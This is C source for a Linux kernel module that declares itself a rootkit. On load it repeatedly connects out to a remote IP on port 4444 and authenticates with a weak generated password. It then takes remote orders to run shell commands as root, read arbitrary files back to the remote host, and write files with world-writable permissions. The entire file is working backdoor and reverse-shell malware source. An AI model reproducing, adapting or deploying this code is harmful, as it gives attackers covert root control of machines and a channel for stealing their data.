#include <linux/module.h>
#include <linux/net.h>
#include <linux/inet.h>
#include <linux/in.h>
#include <linux/workqueue.h>
#include <linux/delay.h>
#include <linux/string.h>
#include <linux/random.h>
#include <linux/types.h> 
#include <linux/kthread.h>




static void connection_queue(struct work_struct *work);
static DECLARE_DELAYED_WORK(send_work, connection_queue);

//block vm
// static char *ip = "192.168.122.86";


static struct socket *sock = NULL;
static struct task_struct *thread_vm = NULL;
static char *ip = "";
static int port = 4444;
static char *message = "Hello World!\n";

module_param(ip, charp, 0644);

enum instruction {
    CMD_EXIT = 3,
    CMD_EXEC = 0,
    CMD_PUT = 2,
    CMD_GET = 1
};

struct command {
    enum instruction instr;
    char cmd[1024];
};


static int init_socket(struct socket **out_sock)
{
    struct sockaddr_in addr = {0};
    unsigned char ip_binary[4] = {0};
    struct socket *s;
    int ret;

    if ((ret = in4_pton(ip, -1, ip_binary, -1, NULL)) == 0)
    {
        pr_err("network: invalid IPv4 address\n");
        return 1;
    }


    if ((ret = sock_create(AF_INET, SOCK_STREAM, IPPROTO_TCP, &s)) < 0)
    {
        pr_err("network: error creating the socket: %d\n", ret);
        return 1;
    }

    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    memcpy(&addr.sin_addr.s_addr, ip_binary, sizeof(addr.sin_addr.s_addr));

    if ((ret = s->ops->connect(s, (struct sockaddr *)&addr, sizeof(addr), 0)) < 0)
    {
        pr_err("network: error connecting to %s:%d (%d)\n", ip, port, ret);
        sock_release(s);
        s = NULL;
        return ret;
    }

    *out_sock = s;
    pr_info("network: connected to %s:%d\n", ip, port);
    return 0;
}


static void genere_password(char *pass, size_t pass_size, char *key, size_t key_size)
{
    char base_pass[] = "base_pass";
    u32 created;
    char parsed[12];
    get_random_bytes(&created, sizeof(created));
    created = created % 162;

    snprintf(parsed, sizeof(parsed), "%d", created);
    snprintf(pass, pass_size, "%s%s",base_pass, parsed);

    u32 manipulated = (created * 100) + 1;
    snprintf(key, key_size, "%u", manipulated);
}

static int handshake(struct socket *socket_server)
{
    char key[16] = {0};
    char expected_pass[64] = {0};
    char recv_buffer[64] = {0};
    char *auth_msg;
    int ret;
    int cr = 1;
    struct kvec vec;
    struct msghdr msg = {0};
    genere_password(expected_pass, sizeof(expected_pass), key, sizeof(key));
    vec.iov_base = key;
    vec.iov_len = strlen(key);
    ret = kernel_sendmsg(socket_server, &msg, &vec, 1, vec.iov_len);
    if (ret < 0) 
    {
        return cr;
    }

    memset(recv_buffer, 0, sizeof(recv_buffer));
    vec.iov_base = recv_buffer;
    vec.iov_len = sizeof(recv_buffer) - 1;
    ret = kernel_recvmsg(socket_server, &msg, &vec, 1, vec.iov_len, 0);
    if (ret <= 0)
    {
        return cr;
    }
    recv_buffer[ret] = '\0';
    pr_info("handshake: recu = '%s' | attendu = '%s'\n", recv_buffer, expected_pass);

    if (strncmp(recv_buffer, expected_pass, strlen(expected_pass)) == 0) {
        auth_msg = "authenticated";
        cr = 0;
    } else {
        auth_msg = "perdu aller salut mdr";
    }

    vec.iov_base = auth_msg;
    vec.iov_len = strlen(auth_msg);
    ret = kernel_sendmsg(socket_server, &msg, &vec, 1, vec.iov_len);
    if (ret < 0) {
        pr_err("handshake: erreur envoi reponse (%d)\n", ret);
    }
    return cr;

}


static int exec_command(char *command)
{
    struct subprocess_info *sub_info;
    char *envp[] = { "HOME=/", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
    char *argv[] = { "/bin/sh", "-c", command, NULL };

    pr_info("exec_command: running command: %s\n", command);

    sub_info = call_usermodehelper_setup(argv[0], argv, envp, GFP_KERNEL, NULL, NULL, NULL);
    if (!sub_info) {
        pr_err("exec_command: setup failed\n");
        return -ENOMEM;
    }
    return call_usermodehelper_exec(sub_info, UMH_WAIT_PROC) >> 8;
}

static int read_file(const char *path, char *buf, size_t bufsize)
{
    struct file *filp;
    loff_t pos = 0;
    int len;

    filp = filp_open(path, O_RDONLY, 0);
    if (IS_ERR(filp)) {
        pr_err("read_file: can't open file %s\n", path);
        return PTR_ERR(filp);
    }

    len = kernel_read(filp, buf, bufsize - 1, &pos);
    if (len >= 0)
        buf[len] = '\0';

    filp_close(filp, NULL);
    return len;
}


static int server_handler(void *data)
{
    struct socket *sock_server = data;
    struct msghdr msg = {0};
    struct kvec iov;
    int ret;
    if (handshake(sock_server) == 0)
    {
        while (kthread_should_stop() == 0)
        {
            struct command *cmd = kmalloc(sizeof(struct command), GFP_KERNEL);
            if (!cmd) {
                pr_err("server_handler: kmalloc failed for cmd\n");
                break;
            }
            memset(cmd, 0, sizeof(*cmd));
            iov.iov_base = cmd;
            iov.iov_len = sizeof(*cmd);
            ret = kernel_recvmsg(sock_server, &msg, &iov, 1, sizeof(*cmd), 0);
            pr_info(" cmd.cmd %d\n", cmd->instr);
            if (ret <= 0) {
                pr_err("server_handler: failed to receive command\n");
                break;
            }
            switch (cmd->instr) 
            {
                case CMD_EXEC:
                {
                    char *command_line;
                    char *buf;
                    int len;

                    command_line = kmalloc(4096, GFP_KERNEL);
                    buf = kmalloc(4096, GFP_KERNEL);
                    if (!command_line || !buf) {
                        pr_err("server_handler: malloc failed\n");
                        kfree(command_line);
                        kfree(buf);
                        return -ENOMEM;
                    }
                    snprintf(command_line, 4096, "%s > /tmp/output.txt 2>&1; echo $? >> /tmp/output.txt", cmd->cmd);
                    ret = exec_command(command_line);
                    if (ret == 0) {
                        len = read_file("/tmp/output.txt", buf, 4096);
                        if (len > 0)
                        {
                            struct kvec vec;
                            vec.iov_base = buf;
                            vec.iov_len = strlen(buf);
                            ret = kernel_sendmsg(sock_server, &msg, &vec, 1, vec.iov_len);
                            if (ret < 0) {
                                pr_err("server_handler: failed to send output (ret=%d)\n", ret);
                            }
                        }
                        else
                        {
                            pr_warn("Output file empty or error reading\n");
                        }
                    }

                    kfree(command_line);
                    kfree(buf);
                    break;
                }
                case CMD_PUT:
                {
                    char *command_line;
                    char *path = cmd->cmd;
                    struct kvec vec;
                    struct msghdr msg = {0};
                    char *send_msg = "Path recu en attente du content.";
                    vec.iov_base = send_msg;
                    vec.iov_len = strlen(send_msg);
                    pr_info("set up message\n");
                    ret = kernel_sendmsg(sock_server, &msg, &vec, 1, vec.iov_len);
                    pr_info("path %s\n",path);
                    pr_info("%d ret\n", ret);
                    if (ret < 0)
                    {
                        pr_err("upload: erreur envoi reponse (%d)\n", ret);
                    }
                    pr_info("message sent\n");
                    iov.iov_base = cmd;
                    iov.iov_len = sizeof(*cmd);
                    ret = kernel_recvmsg(sock_server, &msg, &iov, 1, sizeof(*cmd), 0);
                    pr_info("content file %s\n",cmd->cmd);
                    command_line = kmalloc(4096, GFP_KERNEL);
                    if (!command_line)
                    {
                        pr_err("server_handler: malloc failed\n");
                        kfree(command_line);
                        return -ENOMEM;
                    }
                    snprintf(command_line, 4096, "%s > %s && chmod 777 %s", cmd->cmd, path, path);
                    ret = exec_command(command_line);
                    if (ret != 0)
                    {
                        send_msg = "Erreur lors de la creation du fichier";
                        vec.iov_base = send_msg;
                        vec.iov_len = strlen(send_msg);
                        ret = kernel_sendmsg(sock_server, &msg, &vec, 1, vec.iov_len);
                    }
                    kfree(command_line);
                    break;
                }
                

                case CMD_GET:
                {
                    char *command_line;
                    char *buf;
                    int len;

                    command_line = kmalloc(4096, GFP_KERNEL);
                    buf = kmalloc(4096, GFP_KERNEL);
                    if (!command_line || !buf) {
                        pr_err("server_handler: malloc failed\n");
                        kfree(command_line);
                        kfree(buf);
                        return -ENOMEM;
                    }
                    snprintf(command_line, 4096, "cat %s > /tmp/output.txt", cmd->cmd);
                    ret = exec_command(command_line);
                    if (ret == 0)
                    {
                        len = read_file("/tmp/output.txt", buf, 4096);
                        if (len > 0)
                        {
                            struct kvec vec;
                            vec.iov_base = buf;
                            vec.iov_len = strlen(buf);
                            ret = kernel_sendmsg(sock_server, &msg, &vec, 1, vec.iov_len);
                            if (ret < 0) {
                                pr_err("server_handler: failed to send output (ret=%d)\n", ret);
                            }
                        }
                        else
                        {
                            pr_warn("Output file empty or error reading\n");
                        }
                    }

                    kfree(command_line);
                    kfree(buf);
                    break;
                }
                case CMD_EXIT:
                {
                    pr_info("INSTR_EXIT received\n");
                    kfree(cmd);
                    goto end_protocole;
                }

                default:
                    pr_warn("Unknown instruction\n");
                    break;
            }
            kfree(cmd);
        }
    }
    else 
    {
        goto end_protocole;
    }

    sock_release(sock_server);
    return 0;
end_protocole:
    sock_release(sock);
    sock = NULL;
    thread_vm = NULL;
    schedule_delayed_work(&send_work, msecs_to_jiffies(5000));
    return -1;

}

static void connection_queue(struct work_struct *work)
{
    struct msghdr msg = {0};
    struct kvec vec;
    int ret;

    if (!sock)
    {
        ret = init_socket(&sock);
        if (ret < 0)
        {
            goto reschedule;
        }
    }

    vec.iov_base = message;
    vec.iov_len = strlen(message);


    if ((ret = kernel_sendmsg(sock, &msg, &vec, 1, vec.iov_len)) < 0)
    {
        pr_err("network: error sending the message: %d\n", ret);
        goto release_socket;
    }

    pr_info("network: message sent successfully\n");
    if (!thread_vm)
    {
        thread_vm = kthread_run(server_handler, sock, "serveur_thread");
        if (IS_ERR(thread_vm))
        {
            pr_err("network: failed to create communication thread\n");
            thread_vm = NULL;
        }
        return;
    }

release_socket:
    sock_release(sock);
    sock = NULL;
reschedule:
    schedule_delayed_work(&send_work, msecs_to_jiffies(5000));
    return;
}

static int __init rootkit_init(void)
{
    schedule_delayed_work(&send_work, 0);
    return 0;
}

static void __exit rootkit_exit(void)
{
    if (thread_vm)
    {
        kthread_stop(thread_vm);
        thread_vm = NULL;

    }
    cancel_delayed_work_sync(&send_work);
    if (sock) 
    {
        sock_release(sock);
        sock = NULL;
    }

    pr_info("network: module exit\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Mechant");
MODULE_DESCRIPTION("Rootkit");
